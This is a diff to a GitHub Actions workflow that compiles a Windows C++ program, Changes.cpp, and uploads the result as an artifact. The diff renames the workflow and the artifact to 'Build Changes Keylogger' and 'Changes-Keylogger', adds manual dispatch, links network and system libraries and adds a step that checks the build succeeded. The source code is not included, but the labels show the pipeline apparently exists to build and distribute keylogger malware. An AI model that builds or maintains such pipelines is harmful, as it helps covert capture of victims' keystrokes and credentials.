@@ -1,5 +1,5 @@
-name: Build
-on: [push]
+name: Build Changes Keylogger
+on: [push, workflow_dispatch]
 
 jobs:
   compile:
@@ -7,8 +7,28 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - uses: ilammy/msvc-dev-cmd@v1
-    - run: cl Changes.cpp /FeChanges.exe /O2 /MT winhttp.lib user32.lib shell32.lib ole32.lib gdi32.lib
-    - uses: actions/upload-artifact@v4
+    
+    - name: Compile
+      run: |
+        cl Changes.cpp ^
+          /FeChanges.exe ^
+          /O2 /MT ^
+          /D UNICODE /D _UNICODE ^
+          winhttp.lib user32.lib shell32.lib ole32.lib gdi32.lib advapi32.lib ^
+          /nologo
+          
+    - name: Verify
+      run: |
+        if (Test-Path Changes.exe) {
+          echo "✅ Compilation successful!"
+          echo "File size: $((Get-Item Changes.exe).Length) bytes"
+        } else {
+          echo "❌ Compilation failed!"
+          exit 1
+        }
+        
+    - name: Upload
+      uses: actions/upload-artifact@v4
       with:
-        name: Changes.exe
+        name: Changes-Keylogger
         path: Changes.exe
